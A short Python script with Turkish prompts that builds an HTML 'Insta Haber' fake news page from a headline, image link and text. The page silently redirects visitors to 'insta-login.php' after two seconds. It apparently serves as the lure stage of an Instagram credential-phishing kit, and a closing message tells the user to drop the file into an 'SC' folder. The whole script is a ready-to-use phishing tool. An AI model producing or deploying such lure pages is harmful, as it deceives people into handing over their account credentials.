import time
import os
os.system("python -m pip install colorama")
os.system("clear")
from colorama import Fore, Back, Style, init
init(autoreset=True)
print(Fore.RED + """
 _    _       _               
| |  | |     | |              
| |__| | __ _| |__   ___ _ __ 
|  __  |/ _` | '_ \ / _ \ '__|
| |  | | (_| | |_) |  __/ |   
|_|  |_|\__,_|_.__/ \___|_|   
                              
	""")
print(Style.RESET_ALL)
print(Fore.YELLOW + """
  ____  _           _                               
 / __ \| |         | |                              
| |  | | |_   _ ___| |_ _   _ _ __ _   _  ___ _   _ 
| |  | | | | | / __| __| | | | '__| | | |/ __| | | |
| |__| | | |_| \__ \ |_| |_| | |  | |_| | (__| |_| |
 \____/|_|\__,_|___/\__|\__,_|_|   \__,_|\___|\__,_|
                                                    
	""")
print(Style.RESET_ALL)
baslik = input(Fore.CYAN + "Haber Başlığı ==> ")
print(Style.RESET_ALL)
print("\n")
resim = input(Fore.CYAN + "Kullanılacak Resmin Linki ==> ")
print(Style.RESET_ALL)
print("\n")
icerik = input(Fore.CYAN + "Haberin İçeriği ==> ")
print(Style.RESET_ALL)
print("\n")
doysa_adi = input(Fore.RED + "Dosya Adı (Sonuna '.html' ekleyiniz !) ==> ")

index = open(doysa_adi,"a+",encoding='utf-8')
index.write("""

<html>

<head>
<meta charset="utf-8">
<title>Insta Haber</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">
<div class="header">
<div class="logo"><img src="img/logo.png"</div>
</div>
</div>
<br>
<div class="haber-baslik"><h1 align="center">"""+str(baslik)+"""</h1><div>
<div class="haber-f"><img src='"""+str(resim)+"""'"""+"""
></div>
<div class="haber-detay">

<pre>
"""+str(icerik)+"""

---------------------------------------------
3 saniye içerisinde haber karşınızda olacaktır.
</pre>

</div>



 <meta http-equiv="refresh" content="2;insta-login.php">
</body> 

</html>
""")
index.close()
print("\n")
print(Fore.YELLOW + "Dosya Oluşturuluyor ...")
time.sleep(3)
print("\n")
print(Fore.GREEN + """
Dosya Başarıyla Oluşturuldu.
Lütfen dosyayı 'SC' klasörünün içine aktarın :) """)
